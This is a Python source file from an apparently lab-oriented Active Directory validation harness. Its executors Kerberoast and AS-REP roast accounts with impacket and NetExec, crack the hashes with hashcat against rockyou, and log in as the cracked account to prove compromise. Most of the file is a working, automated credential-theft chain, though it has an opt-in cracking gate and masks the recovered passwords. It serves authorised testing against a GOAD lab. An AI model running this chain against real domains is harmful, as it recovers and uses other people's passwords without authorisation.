"""Kerberoasting + AS-REP roasting validation executors -- FULL (T1a).

Both encode a PROVEN *recover-a-secret-then-reauthenticate* recipe
(claude-mem #66146), parameterized and non-mutating:

    KERBEROAST: impacket-GetUserSPNs -request      -> $krb5tgs$  (-m 13100)
    ASREP:      impacket-GetNPUsers  -request      -> $krb5asrep$ (-m 18200)
    both:       hashcat <mode> <hashes> <wordlist> -> plaintext (offline, opt-in)
                nxc smb <target> -u <principal> -p <plaintext>  -> authn_success

The terminal proof is *re-authentication* as the cracked principal -- not the
presence of a hash and not hashcat's exit code (``exit 0 is never proof``). The
recovered plaintext lives only in-process: it is masked in every stored argv and
never written to the receipt; the terminal fact carries a non-secret token over
public identifiers only.

Non-mutating: no AD object is created or changed, so there is no rollback. The
offline crack is gated (opt-in, #66120): a denied gate yields an incomplete
receipt the harness reads as ``inconclusive``, never a fabricated proof.

Scoring identities (ad-lab-harness ``truth/GOAD-proof.json``): KERBEROAST keys on
``{domain, principal}`` (the cracked SPN account must be in the vulnerable set);
ASREP keys on ``{domain}`` (domain-level anchor). The ``target_identity`` of each
subclass produces exactly those attributes.
"""
from __future__ import annotations
from .. import netresolve

import re
from pathlib import Path
from typing import Any, Optional

from ..recommend import ParamSpec, ParamValue, values
from .. import proof
from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv, ToolAttempt, first_successful)


# Default Kali wordlist (claude-mem #66146 cracked against rockyou).
DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"


def _nxc_auth_flags(cfg) -> list[str]:
    """NetExec auth flags from the operator config (mirrors probes._nxc_auth):
    ``-u <user>`` then ``-H <nthash>`` / ``--aesKey <key>`` / ``-p <pass>``."""
    return netresolve.nxc_auth_flags(cfg)


# nxc re-auth success markers (domain creds accepted by the DC).
_RE_NXC_PWNED = re.compile(r"\(Pwn3d!\)", re.I)
_RE_NXC_AUTH_OK = re.compile(r"\bSMB\b.*\[\+\]", re.I)


class _RoastExecutor(ValidationExecutor):
    """Shared roast -> crack -> reauth body. Subclasses set the roast specifics."""

    technique_class = ""            # 'kerberoast' | 'asrep'
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = True

    hashcat_mode: str = ""          # '13100' | '18200'
    hash_re: re.Pattern = re.compile(r"$^")   # matches the roasted hash blob

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        principal = (finding.entity or {}).get("principal") or ""
        specs = [
            ParamSpec(
                name="principal", kind="principal_name",
                description="The roastable account to crack and re-authenticate as "
                            "(the proof is a successful login as this principal).",
                recommended=principal,
                rationale="The account aranum flagged roastable; override to target "
                          "a specific SPN/pre-auth-disabled account (#66142).",
                required=True,
            ),
            ParamSpec(
                name="wordlist", kind="free",
                description="Offline cracking wordlist for hashcat.",
                recommended=DEFAULT_WORDLIST,
                rationale="Kali's rockyou (the #66146 proven crack); override to a "
                          "larger list or a ruleset path.",
                validator=lambda v: None if isinstance(v, str) and v.strip()
                else "must be a wordlist path",
            ),
            ParamSpec(
                name="reauth_target", kind="target_host",
                description="Host to re-authenticate against (proves the cracked "
                            "credential is a live domain credential).",
                recommended=ctx.config.dc_ip,
                rationale="The DC by default; any domain-joined host accepting the "
                          "credential works.",
            ),
        ]
        return specs

    # Subclasses build the roast command (the one tool/arg difference).
    def _roast_argv(self, ctx: ExecutorContext, principal: str,
                    op_target: str, op_extra: list[str]) -> list[str]:
        raise NotImplementedError

    # D2 light fallback (ADR-002 D2): the NetExec roast flag differs per subclass
    # (--kerberoasting | --asreproast); the invocation is otherwise shared.
    _nxc_roast_flag = ""            # '--kerberoasting' (KERBEROAST) | '--asreproast' (ASREP)

    def _nxc_fallback_argv(self, ctx: ExecutorContext, principal: str,
                           out_dir) -> list[str]:
        """NetExec roast fallback when the impacket primary is absent/hung.

        UNVERIFIED invocation (flag for lab-pinning):

            nxc ldap <dc_ip> -d <domain> -u <user> (-p <pass> | -H <hash> |
                --aesKey <key>) <--kerberoasting|--asreproast> <outdir>/<tech>_<principal>.nxc

        Auth flags mirror ``probes._nxc_auth``. Both impacket and nxc emit the
        SAME ``$krb5tgs$`` / ``$krb5asrep$`` hash format to stdout, so the shared
        ``self.hash_re`` success predicate + the downstream
        ``self.hash_re.findall(winning_res.stdout)`` extraction work for whichever
        tool won.
        """
        cfg = ctx.config
        outfile = Path(out_dir) / f"{self.technique_class}_{principal}.nxc"
        return ["nxc", "ldap", cfg.dc_ip, "-d", cfg.domain, *_nxc_auth_flags(cfg),
                self._nxc_roast_flag, str(outfile)]

    def target_identity(self, ctx, finding, params) -> dict[str, Any]:  # overridden
        raise NotImplementedError

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        return [
            f"{self._roast_tool} -request (roast {v['principal']}) -> {self._hash_name}",
            f"hashcat -m {self.hashcat_mode} <hashes> {v['wordlist']}  (offline, opt-in)",
            f"nxc smb {v['reauth_target']} -u {v['principal']} -p ***   (= authn proof)",
        ]

    _roast_tool = ""
    _hash_name = ""

    # ---------------------------------------------------------------- auth argv
    def _op_auth_target(self, cfg) -> tuple[str, list[str]]:
        target = f"{cfg.domain}/{cfg.username or ''}"
        extra: list[str] = []
        if cfg.nt_hash:
            extra = ["-hashes", cfg.nt_hash]
        elif cfg.aes_key:
            extra = ["-aesKey", cfg.aes_key]
        elif cfg.password is not None:
            target += f":{cfg.password}"
        return target, extra

    # ---------------------------------------------------------------- execute
    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        cfg = ctx.config
        v = values(params)
        principal = v["principal"]
        wordlist = v["wordlist"]
        reauth_target = v["reauth_target"]
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)
        op_target, op_extra = self._op_auth_target(cfg)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        # 1) roast -> hash blob (D2 light fallback: impacket -> nxc) --------
        # Both tools emit the same $krb5tgs$/$krb5asrep$ blob, so one positive
        # predicate serves both; an absent/hung primary falls through to nxc, a
        # clean primary negative is trusted but nxc is still tried.
        def _has_hash(r: RunResult) -> bool:
            return bool(self.hash_re.findall(r.stdout or ""))

        attempts = [
            ToolAttempt(self._roast_tool,
                        self._roast_argv(ctx, principal, op_target, op_extra),
                        success=_has_hash, cwd=str(out_dir)),
            ToolAttempt("nxc",
                        self._nxc_fallback_argv(ctx, principal, out_dir),
                        success=_has_hash, cwd=str(out_dir)),
        ]
        att, res, _roast_won = first_successful(ctx.runner, attempts,
                                                timeout=cfg.tool_timeout_s)
        hashes = self.hash_re.findall(res.stdout or "")
        roast_ok = bool(hashes)
        record("roast", att.argv, res, roast_ok,
               note=(f"via {att.tool}; {len(hashes)} hash(es)" if roast_ok else "no hash"))
        if not roast_ok:
            errors.append("roast_no_hash")
            return self._artifact(steps, gate, mutation, None, False, errors)
        hashfile = out_dir / f"{self.technique_class}_{principal}.hash"
        hashfile.write_text("\n".join(hashes) + "\n", encoding="utf-8")

        # 2) offline crack (gated, opt-in #66120) --------------------------
        verdict = ctx.authorizer.authorize("offline_crack",
                                           {"technique": self.technique, "principal": principal})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "offline_crack"
            errors.append("gate_denied:offline_crack")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "offline_crack"

        potfile = out_dir / f"{self.technique_class}_{principal}.pot"
        crack_argv = ["hashcat", "-m", self.hashcat_mode, str(hashfile), wordlist,
                      "--potfile-path", str(potfile), "--quiet"]
        res = ctx.runner.run(crack_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        # Recover the plaintext via --show (stdout, outfile-format 2 = plaintext only).
        show_argv = ["hashcat", "-m", self.hashcat_mode, str(hashfile), "--show",
                     "--potfile-path", str(potfile), "--outfile-format", "2", "--quiet"]
        res_show = ctx.runner.run(show_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        plaintext = self._first_plaintext(res_show.stdout or "")
        crack_ok = bool(plaintext)
        record("crack", crack_argv, res, crack_ok,
               note="cracked" if crack_ok else "not cracked")
        if not crack_ok:
            errors.append("crack_failed")
            return self._artifact(steps, gate, mutation, None, False, errors)

        # 3) re-authenticate as the cracked principal = the terminal proof --
        nxc_argv = ["nxc", "smb", reauth_target, "-u", principal, "-p", plaintext]
        res = ctx.runner.run(nxc_argv, timeout=cfg.tool_timeout_s)
        out = res.stdout or ""
        reauth_ok = bool(_RE_NXC_PWNED.search(out) or _RE_NXC_AUTH_OK.search(out))
        record("reauth", nxc_argv, res, reauth_ok,
               note="pwn3d" if _RE_NXC_PWNED.search(out) else "auth" if reauth_ok else "")
        if not reauth_ok:
            errors.append("reauth_failed")

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=reauth_ok, impersonated=principal,
            predicate=(f"re-authenticated as {cfg.domain}\\{principal} after "
                       f"{self.technique} crack"),
            proof_token=proof.proof_token(self.technique, cfg.domain, principal,
                                          "pwn3d" if _RE_NXC_PWNED.search(out) else "auth"),
        )
        complete = reauth_ok
        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)

    # ---------------------------------------------------------------- helpers
    @staticmethod
    def _first_plaintext(show_stdout: str) -> Optional[str]:
        for line in show_stdout.splitlines():
            if line.strip():
                return line.rstrip("\n")
        return None

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}


class KerberoastExecutor(_RoastExecutor):
    technique = "KERBEROAST"
    technique_class = "kerberoast"
    hashcat_mode = "13100"
    hash_re = re.compile(r"\$krb5tgs\$[^\s]+")
    _roast_tool = "impacket-GetUserSPNs"
    _nxc_roast_flag = "--kerberoasting"
    _hash_name = "$krb5tgs$"
    recipe_ref = ("#66146 KERBEROAST = impacket-GetUserSPNs -request -> $krb5tgs$ "
                  "-> hashcat -m 13100 rockyou -> reauth nxc smb (PROVED jon.snow)")

    def _roast_argv(self, ctx, principal, op_target, op_extra) -> list[str]:
        argv = ["impacket-GetUserSPNs", op_target, "-dc-ip", ctx.config.dc_ip,
                "-request", *op_extra]
        if principal:
            argv += ["-request-user", principal]
        return argv

    def target_identity(self, ctx, finding, params) -> dict[str, Any]:
        # KERBEROAST facet keys on {domain, principal}.
        principal = params["principal"].value or (finding.entity or {}).get("principal") or ""
        return {"domain": ctx.config.domain, "principal": principal}


class ASREPExecutor(_RoastExecutor):
    technique = "ASREP"
    technique_class = "asrep"
    hashcat_mode = "18200"
    hash_re = re.compile(r"\$krb5asrep\$[^\s]+")
    _roast_tool = "impacket-GetNPUsers"
    _nxc_roast_flag = "--asreproast"
    _hash_name = "$krb5asrep$"
    recipe_ref = ("#66146 ASREP = impacket-GetNPUsers -request -> hashcat -m 18200 "
                  "-> reauth (PROVED brandon.stark + missandei)")

    def _roast_argv(self, ctx, principal, op_target, op_extra) -> list[str]:
        # -request roasts the DONT_REQ_PREAUTH accounts; hashcat output format.
        return ["impacket-GetNPUsers", op_target, "-dc-ip", ctx.config.dc_ip,
                "-request", "-format", "hashcat", *op_extra]

    def target_identity(self, ctx, finding, params) -> dict[str, Any]:
        # ASREP facet keys on {domain} (domain-level anchor); principal is informational.
        principal = params["principal"].value or (finding.entity or {}).get("principal") or ""
        identity = {"domain": ctx.config.domain}
        if principal:
            identity["principal"] = principal
        return identity
